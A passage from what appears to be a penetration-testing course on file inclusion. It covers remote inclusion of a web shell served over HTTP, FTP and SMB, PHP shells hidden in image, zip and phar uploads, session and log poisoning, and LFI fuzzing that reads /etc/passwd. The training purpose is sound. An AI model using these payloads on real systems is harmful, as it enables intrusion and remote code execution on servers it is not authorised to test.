+Serving HTTP on <span class="hljs-number">0.0.0.0</span> port &lt;LISTENING_PORT&gt; (http://<span class="hljs-number">0.0.0.0</span>:&lt;LISTENING_PORT&gt;/) ...
+
+SERVER_IP - - <span class="hljs-string">[SNIP]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /shell.php HTTP/1.0"</span> <span class="hljs-number">200</span> -
+</code></pre>
+<p>Tip: We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload</p>
+<h3 id="ftp">FTP</h3>
+<p>As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's <code>pyftpdlib</code>, as follows:</p>
+<p>Remote File Inclusion (RFI)</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sudo python -m pyftpdlib -p <span class="hljs-number">21</span>
+
+<span class="hljs-string">[SNIP]</span> &gt;&gt;&gt; starting FTP server on <span class="hljs-number">0.0.0.0:21</span>, pid=<span class="hljs-number">23686</span> &lt;&lt;&lt;
+<span class="hljs-string">[SNIP]</span> concurrency model: async
+<span class="hljs-string">[SNIP]</span> masquerade (NAT) address: None
+<span class="hljs-string">[SNIP]</span> passive ports: None
+</code></pre>
+<p>This may also be useful in case http ports are blocked by a firewall or the <code>http://</code> string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the <code>ftp://</code> scheme in the URL, as follows:</p>
+<p><img src="storage\modules\23\rfi\_localhost.jpg" alt=""></p>
+<p>As we can see, this worked very similarly to our http attack, and the command was executed. By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:</p>
+<p>Remote File Inclusion (RFI)</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl 'http:/</span><span class="hljs-regexp">/&lt;SERVER_IP&gt;:&lt;PORT&gt;/</span>index.php?language=ftp:<span class="hljs-comment">//user:pass@localhost/shell.php&amp;cmd=id'</span>
+...SNIP...
+uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)
+</code></pre>
+<h3 id="smb">SMB</h3>
+<p>If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the <code>allow_url_include</code> setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.</p>
+<p>We can spin up an SMB server using <code>Impacket's smbserver.py</code>, which allows anonymous authentication by default, as follows:</p>
+<p>Remote File Inclusion (RFI)</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ impacket-smbserver -smb2support share $(<span class="hljs-keyword">pwd</span>)
+Impacket v0<span class="hljs-number">.9</span><span class="hljs-number">.24</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation
+
+[*] Config <span class="hljs-keyword">file</span> parsed
+[*] Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">4</span>B324FC8<span class="hljs-number">-1670</span><span class="hljs-number">-01</span>D3<span class="hljs-number">-1278</span><span class="hljs-number">-5</span>A47BF6EE188 V:<span class="hljs-number">3.0</span>
+[*] Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">6</span>BFFD098-A112<span class="hljs-number">-3610</span><span class="hljs-number">-9833</span><span class="hljs-number">-46</span>C3F87E345A V:<span class="hljs-number">1.0</span>
+[*] Config <span class="hljs-keyword">file</span> parsed
+[*] Config <span class="hljs-keyword">file</span> parsed
+[*] Config <span class="hljs-keyword">file</span> parsed
+</code></pre>
+<p>Now, we can include our script by using a UNC path (e.g. <code>\\&lt;OUR_IP&gt;\share\shell.php</code>), and specify the command with (<code>&amp;cmd=whoami</code>) as we did earlier:</p>
+<p><img src="storage\modules\23\windows\_rfi.png" alt=""></p>
+<p>As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is <code>more likely to work if we were on the same network</code>, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.</p>
+<h2 id="lfi-and-file-uploads">LFI and File Uploads</h2>
+<p>File upload functionalities are ubiquitous in most modern web applications, as users usually need to configure their profile and usage of the web application by uploading their data. For attackers, the ability to store files on the back-end server may extend the exploitation of many vulnerabilities, like a file inclusion vulnerability.</p>
+<p>The <a href="https://academy.hackthebox.com/module/details/136">File Upload Attacks</a> module covers different techniques on how to exploit file upload forms and functionalities. However, for the attack we are going to discuss in this section, we do not require the file upload form to be vulnerable, but merely allow us to upload files. If the vulnerable function has code <code>Execute</code> capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. <code>image.jpg</code>), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.</p>
+<p>As mentioned in the first section, the following are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Function</strong></th>
+<th style="text-align:center"><strong>Read Content</strong></th>
+<th style="text-align:center"><strong>Execute</strong></th>
+<th style="text-align:center"><strong>Remote URL</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PHP</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>include()</code>/<code>include_once()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+</tr>
+<tr>
+<td><code>require()</code>/<code>require_once()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+</tr>
+<tr>
+<td><strong>NodeJS</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>res.render()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+</tr>
+<tr>
+<td><strong>Java</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>import</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+</tr>
+<tr>
+<td><strong>.NET</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="image-upload">Image upload</h3>
+<p>Image upload is very common in most modern web applications, as uploading images is widely regarded as safe if the upload function is securely coded. However, as discussed earlier, the vulnerability, in this case, is not in the file upload form but the file inclusion functionality.</p>
+<p><strong>Crafting Malicious Image</strong></p>
+<p>Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. <code>shell.gif</code>), and should also include the image magic bytes at the beginning of the file content (e.g. <code>GIF8</code>), just in case the upload form checks for both the extension and content type as well. We can do so as follows:</p>
+<p>LFI and File Uploads</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ echo 'GIF8<span class="php"><span class="hljs-meta">&lt;?php</span> system($_GET[<span class="hljs-string">"cmd"</span>]); <span class="hljs-meta">?&gt;</span></span>' &gt; shell.gif
+</code></pre>
+<p>This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.</p>
+<p>Note: We are using a <code>GIF</code> image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type. The <a href="https://academy.hackthebox.com/module/details/136">File Upload Attacks</a> module goes more in depth for file type attacks, and the same logic can be applied here.</p>
+<p>Now, we need to upload our malicious image file. To do so, we can go to the <code>Profile Settings</code> page and click on the avatar image to select our image, and then click on upload and our image should get successfully uploaded:</p>
+<p><img src="storage\modules\23\lfi\_upload\_gif.jpg" alt=""></p>
+<p><strong>Uploaded File Path</strong></p>
+<p>Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">&lt;img src=<span class="hljs-string">"/profile_images/shell.gif"</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">"profile-image"</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">"profile-image"</span>&gt;
+</code></pre>
+<p>Note: As we can see, we can use `/profile_images/shell.gif` for the file path. If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly hide the uploaded files.</p>
+<p>With the uploaded file path at hand, all we need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed, as follows:</p>
+<p><img src="storage\modules\23\lfi\_include\_uploaded\_gif.jpg" alt=""></p>
+<p>As we can see, we included our file and successfully executed the <code>id</code> command.</p>
+<p>Note: To include to our uploaded file, we used <code>./profile_images/</code> as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to <code>../</code> out of that directory and then use our URL path, as we learned in previous sections.</p>
+<hr>
+<h3 id="zip-upload">Zip Upload</h3>
+<p>As mentioned earlier, the above technique is very reliable and should work in most cases and with most web frameworks, as long as the vulnerable function allows code execution. There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal. These techniques may become handy in some specific cases where the above technique does not work.</p>
+<p>We can utilize the <a href="https://www.php.net/manual/en/wrappers.compression.php">zip</a> wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named <code>shell.jpg</code>), as follows:</p>
+<p>LFI and File Uploads</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ echo '&lt;?php system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"cmd"</span>]); ?&gt;' &gt; <span class="hljs-keyword">shell</span>.php &amp;&amp; <span class="hljs-keyword">zip</span> <span class="hljs-keyword">shell</span>.jpg <span class="hljs-keyword">shell</span>.php
+</code></pre>
+<p>Note: Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.</p>
+<p>Once we upload the <code>shell.jpg</code> archive, we can include it with the <code>zip</code> wrapper as (<code>zip://shell.jpg</code>), and then refer to any files within it with <code>#shell.php</code> (URL encoded). Finally, we can execute commands as we always do with <code>&amp;cmd=id</code>, as follows:</p>
+<p><img src="storage\modules\23\data\_wrapper\_id.png" alt=""></p>
+<p>As we can see, this method also works in executing commands through zipped PHP scripts.</p>
+<p>Note: We added the uploads directory (<code>./profile_images/</code>) before the file name, as the vulnerable page (<code>index.php</code>) is in the main directory.</p>
+<hr>
+<h3 id="phar-upload">Phar Upload</h3>
+<p>Finally, we can use the <code>phar://</code> wrapper to achieve a similar result. To do so, we will first write the following PHP script into a <code>shell.php</code> file:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">'shell.phar'</span>);
+$phar-&gt;startBuffering();
+$phar-&gt;addFromString(<span class="hljs-string">'shell.txt'</span>, <span class="hljs-string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>);
+$phar-&gt;setStub(<span class="hljs-string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);
+
+$phar-&gt;stopBuffering();
+</code></pre>
+<p>This script can be compiled into a <code>phar</code> file that when called would write a web shell to a <code>shell.txt</code> sub-file, which we can interact with. We can compile it into a <code>phar</code> file and rename it to <code>shell.jpg</code> as follows:</p>
+<p>LFI and File Uploads</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ php --define phar.readonly=<span class="hljs-number">0</span> shell<span class="hljs-selector-class">.php</span> &amp;&amp; mv shell<span class="hljs-selector-class">.phar</span> shell.jpg
+</code></pre>
+<p>Now, we should have a phar file called <code>shell.jpg</code>. Once we upload it to the web application, we can simply call it with <code>phar://</code> and provide its URL path, and then specify the phar sub-file with <code>/shell.txt</code> (URL encoded) to get the output of the command we specify with (<code>&amp;cmd=id</code>), as follows:</p>
+<p><img src="storage\modules\23\rfi\_localhost.jpg" alt=""></p>
+<p>As we can see, the <code>id</code> command was successfully executed. Both the <code>zip</code> and <code>phar</code> wrapper methods should be considered as alternative methods in case the first method did not work, as the first method we discussed is the most reliable among the three.</p>
+<p>Note: There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the <code>phpinfo()</code> page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo">This Link</a>.</p>
+<h2 id="log-poisoning">Log Poisoning</h2>
+<p>We have seen in previous sections that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the <code>Execute</code> privileges. The attacks we will discuss in this section all rely on the same concept: Writing PHP code in a field we control that gets logged into a log file (i.e. <code>poison</code>/<code>contaminate</code> the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.</p>
+<p>As was the case in the previous section, any of the following functions with <code>Execute</code> privileges should be vulnerable to these attacks:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Function</strong></th>
+<th style="text-align:center"><strong>Read Content</strong></th>
+<th style="text-align:center"><strong>Execute</strong></th>
+<th style="text-align:center"><strong>Remote URL</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PHP</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>include()</code>/<code>include_once()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+</tr>
+<tr>
+<td><code>require()</code>/<code>require_once()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+</tr>
+<tr>
+<td><strong>NodeJS</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>res.render()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+</tr>
+<tr>
+<td><strong>Java</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>import</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+</tr>
+<tr>
+<td><strong>.NET</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="php-session-poisoning">PHP Session Poisoning</h3>
+<p>Most PHP web applications utilize <code>PHPSESSID</code> cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in <code>session</code> files on the back-end, and saved in <code>/var/lib/php/sessions/</code> on Linux and in <code>C:\Windows\Temp\</code> on Windows. The name of the file that contains our user's data matches the name of our <code>PHPSESSID</code> cookie with the <code>sess_</code> prefix. For example, if the <code>PHPSESSID</code> cookie is set to <code>el4ukv0kqbvoirg7nkp4dncpk3</code>, then its location on disk would be <code>/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3</code>.</p>
+<p>The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have a <code>PHPSESSID</code> cookie set to our session: <img src="storage\modules\23\rfi\_cookies\_storage.png" alt="image"></p>
+<p>As we can see, our <code>PHPSESSID</code> cookie value is <code>nhhv8i0o6ua4g88bkdl9u1fdsd</code>, so it should be stored at <code>/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code>. Let's try include this session file through the LFI vulnerability and view its contents:</p>
+<p><img src="storage\modules\23\rfi\_session\_include.png" alt=""></p>
+<p>Note: As you may easily guess, the cookie value will differ from one session to another, so you need to use the cookie value you find in your own session to perform the same attack.</p>
+<p>We can see that the session file contains two values: <code>page</code>, which shows the selected language page, and <code>preference</code>, which shows the selected language. The <code>preference</code> value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the <code>page</code> value is under our control, as we can control it through the <code>?language=</code> parameter.</p>
+<p>Let's try setting the value of <code>page</code> a custom value (e.g. <code>language parameter</code>) and see if it changes in the session file. We can do so by simply visiting the page with <code>?language=session_poisoning</code> specified, as follows:</p>
+<p>Code: url</p>
+<pre><code class="lang-url">http://<span class="hljs-symbol">&lt;SERVER_IP&gt;</span>:<span class="hljs-symbol">&lt;PORT&gt;</span>/<span class="hljs-built_in">index</span>.php?<span class="hljs-keyword">language</span>=session_poisoning
+</code></pre>
+<p>Now, let's include the session file once again to look at the contents:</p>
+<p><img src="storage\modules\23\lfi\_poisoned\_sessid.png" alt=""></p>
+<p>This time, the session file contains <code>session_poisoning</code> instead of <code>es.php</code>, which confirms our ability to control the value of <code>page</code> in the session file. Our next step is to perform the <code>poisoning</code> step by writing PHP code to the session file. We can write a basic PHP web shell by changing the <code>?language=</code> parameter to a URL encoded web shell, as follows:</p>
+<p>Code: url</p>
+<pre><code class="lang-url"><span class="hljs-attribute">http</span>://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=<span class="hljs-number">%3</span>C<span class="hljs-number">%3</span>Fphp<span class="hljs-number">%20</span>system<span class="hljs-number">%28</span><span class="hljs-number">%24</span>_GET<span class="hljs-number">%5</span>B<span class="hljs-number">%22</span>cmd<span class="hljs-number">%22</span><span class="hljs-number">%5</span>D<span class="hljs-number">%29</span><span class="hljs-number">%3</span>B<span class="hljs-number">%3</span>F<span class="hljs-number">%3</span>E
+</code></pre>
+<p>Finally, we can include the session file and use the <code>&amp;cmd=id</code> to execute a commands:</p>
+<p><img src="storage\modules\23\rfi\_session\_id.png" alt=""></p>
+<p>Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with <code>/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code> after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.</p>
+<hr>
+<h3 id="server-log-poisoning">Server Log Poisoning</h3>
+<p>Both <code>Apache</code> and <code>Nginx</code> maintain various log files, such as <code>access.log</code> and <code>error.log</code>. The <code>access.log</code> file contains various information about all requests made to the server, including each request's <code>User-Agent</code> header. As we can control the <code>User-Agent</code> header in our requests, we can use it to poison the server logs as we did above.</p>
+<p>Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. <code>Nginx</code> logs are readable by low privileged users by default (e.g. <code>www-data</code>), while the <code>Apache</code> logs are only readable by users with high privileges (e.g. <code>root</code>/<code>adm</code> groups). However, in older or misconfigured <code>Apache</code> servers, these logs may be readable by low-privileged users.</p>
+<p>By default, <code>Apache</code> logs are located in <code>/var/log/apache2/</code> on Linux and in <code>C:\xampp\apache\logs\</code> on Windows, while <code>Nginx</code> logs are located in <code>/var/log/nginx/</code> on Linux and in <code>C:\nginx\log\</code> on Windows. However, the logs may be in a different location in some cases, so we may use an <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Wordlist</a> to fuzz for their locations, as will be discussed in the next section.</p>
+<p>So, let's try including the Apache access log from <code>/var/log/apache2/access.log</code>, and see what we get:</p>
+<p><img src="storage\modules\23\rfi\_access\_log.png" alt=""></p>
+<p>As we can see, we can read the log. The log contains the <code>remote IP address</code>, <code>request page</code>, <code>response code</code>, and the <code>User-Agent</code> header. As mentioned earlier, the <code>User-Agent</code> header is controlled by us through the HTTP request headers, so we should be able to poison this value.</p>
+<p>Tip: Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.</p>
+<p>To do so, we will use <code>Burp Suite</code> to intercept our earlier LFI request and modify the <code>User-Agent</code> header to <code>Apache Log Poisoning</code>: <img src="storage\modules\23\rfi\_repeater\_ua.png" alt="image"></p>
+<p>Note: As all requests to the server get logged, we can poison any request to the web application, and not necessarily the LFI one as we did above.</p>
+<p>As expected, our custom User-Agent value is visible in the included log file. Now, we can poison the <code>User-Agent</code> header by setting it to a basic PHP web shell: <img src="storage\modules\23\rfi\_cmd\_repeater.png" alt="image"></p>
+<p>We may also poison the log by sending a request through cURL, as follows:</p>
+<p>Log Poisoning</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s "http://<span class="hljs-tag">&lt;<span class="hljs-name">SERVER_IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/index.php" -A "<span class="php"><span class="hljs-meta">&lt;?php</span> system($_GET[<span class="hljs-string">'cmd'</span>]); <span class="hljs-meta">?&gt;</span></span>"
+</code></pre>
+<p>As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (<code>?cmd=id</code>): <img src="storage\modules\23\rfi\_id\_repeater.png" alt="image"></p>
+<p>We see that we successfully executed the command. The exact same attack can be carried out on <code>Nginx</code> logs as well.</p>
+<p>Tip: The <code>User-Agent</code> header is also shown on process files under the Linux <code>/proc/</code> directory. So, we can try including the <code>/proc/self/environ</code> or <code>/proc/self/fd/N</code> files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.</p>
+<p>Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:</p>
+<ul>
+<li><code>/var/log/sshd.log</code></li>
+<li><code>/var/log/mail</code></li>
+<li><code>/var/log/vsftpd.log</code></li>
+</ul>
+<p>We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the <code>ssh</code> or <code>ftp</code> services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the <code>mail</code> services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.</p>
+<h2 id="automated-scanning">Automated Scanning</h2>
+<p>It is essential to understand how file inclusion attacks work and how we can manually craft advanced payloads and use custom techniques to reach remote code execution. This is because in many cases, for us to exploit the vulnerability, it may require a custom payload that matches its specific configurations. Furthermore, when dealing with security measures like a WAF or a firewall, we have to apply our understanding to see how a specific payload/character is being blocked and attempt to craft a custom payload to work around it.</p>
+<p>We may not need to manually exploit the LFI vulnerability in many trivial cases. There are many automated methods that can help us quickly identify and exploit trivial LFI vulnerabilities. We can utilize fuzzing tools to test a huge list of common LFI payloads and see if any of them work, or we can utilize specialized LFI tools to test for such vulnerabilities. This is what we will discuss in this section.</p>
+<hr>
+<h3 id="fuzzing-parameters">Fuzzing Parameters</h3>
+<p>The HTML forms users can use on the web application front-end tend to be properly tested and well secured against different web attacks. However, in many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.</p>
+<p>The <a href="https://academy.hackthebox.com/module/details/54">Attacking Web Applications with Ffuf</a> module goes into details on how we can fuzz for <code>GET</code>/<code>POST</code> parameters. For example, we can fuzz the page for common <code>GET</code> parameters, as follows:</p>
+<p>Automated Scanning</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ffuf -w /</span>opt<span class="hljs-regexp">/useful/</span>SecLists<span class="hljs-regexp">/Discovery/</span>Web-Content<span class="hljs-regexp">/burp-parameter-names.txt:FUZZ -u 'http:/</span><span class="hljs-regexp">/&lt;SERVER_IP&gt;:&lt;PORT&gt;/</span>index.php?FUZZ=value' -fs 2287
+
+...SNIP...
+
+ :: <span class="hljs-string">Method           :</span> GET
+ :: <span class="hljs-string">URL              :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value</span>
+ :: <span class="hljs-string">Wordlist         :</span> <span class="hljs-string">FUZZ:</span> <span class="hljs-regexp">/opt/</span>useful<span class="hljs-regexp">/SecLists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>burp-parameter-names.txt
+ :: Follow <span class="hljs-string">redirects :</span> <span class="hljs-literal">false</span>
+ :: <span class="hljs-string">Calibration      :</span> <span class="hljs-literal">false</span>
+ :: <span class="hljs-string">Timeout          :</span> <span class="hljs-number">10</span>
+ :: <span class="hljs-string">Threads          :</span> <span class="hljs-number">40</span>
+ :: <span class="hljs-string">Matcher          :</span> Response <span class="hljs-string">status:</span> <span class="hljs-number">200</span>,<span class="hljs-number">204</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>
+ :: <span class="hljs-string">Filter           :</span> Response <span class="hljs-string">size:</span> xxx
+________________________________________________
+
+language                    [<span class="hljs-string">Status:</span> xxx, <span class="hljs-string">Size:</span> xxx, <span class="hljs-string">Words:</span> xxx, <span class="hljs-string">Lines:</span> xxx]
+</code></pre>
+<p>Once we identify an exposed parameter that isn't linked to any forms we tested, we can perform all of the LFI tests discussed in this module. This is not unique to LFI vulnerabilities but also applies to most web vulnerabilities discussed in other modules, as exposed parameters may be vulnerable to any other vulnerability as well.</p>
+<p>Tip: For a more precise scan, we can limit our scan to the most popular LFI parameters found on this <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters">link</a>.</p>
+<hr>
+<h3 id="lfi-wordlists">LFI wordlists</h3>
+<p>So far in this module, we have been manually crafting our LFI payloads to test for LFI vulnerabilities. This is because manual testing is more reliable and can find LFI vulnerabilities that may not be identified otherwise, as discussed earlier. However, in many cases, we may want to run a quick test on a parameter to see if it is vulnerable to any common LFI payload, which may save us time in web applications where we need to test for various vulnerabilities.</p>
+<p>There are a number of <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Wordlists</a> we can use for this scan. A good wordlist is <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI-Jhaddix.txt</a>, as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the <code>?language=</code> parameter we have been testing throughout the module, as follows:</p>
+<p>Automated Scanning</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ffuf -w /</span>opt<span class="hljs-regexp">/useful/</span>SecLists<span class="hljs-regexp">/Fuzzing/</span>LFI<span class="hljs-regexp">/LFI-Jhaddix.txt:FUZZ -u 'http:/</span><span class="hljs-regexp">/&lt;SERVER_IP&gt;:&lt;PORT&gt;/</span>index.php?language=FUZZ' -fs 2287
+
+...SNIP...
+
+ :: <span class="hljs-string">Method           :</span> GET
+ :: <span class="hljs-string">URL              :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=key</span>
+ :: <span class="hljs-string">Wordlist         :</span> <span class="hljs-string">FUZZ:</span> <span class="hljs-regexp">/opt/</span>useful<span class="hljs-regexp">/SecLists/</span>Fuzzing<span class="hljs-regexp">/LFI/</span>LFI-Jhaddix.txt
+ :: Follow <span class="hljs-string">redirects :</span> <span class="hljs-literal">false</span>
+ :: <span class="hljs-string">Calibration      :</span> <span class="hljs-literal">false</span>
+ :: <span class="hljs-string">Timeout          :</span> <span class="hljs-number">10</span>
+ :: <span class="hljs-string">Threads          :</span> <span class="hljs-number">40</span>
+ :: <span class="hljs-string">Matcher          :</span> Response <span class="hljs-string">status:</span> <span class="hljs-number">200</span>,<span class="hljs-number">204</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>
+ :: <span class="hljs-string">Filter           :</span> Response <span class="hljs-string">size:</span> xxx
+________________________________________________
+
+..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>Fetc/passwd [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">3661</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">645</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">91</span>]
+..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/hosts [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">2461</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">636</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">72</span>]
+...SNIP...
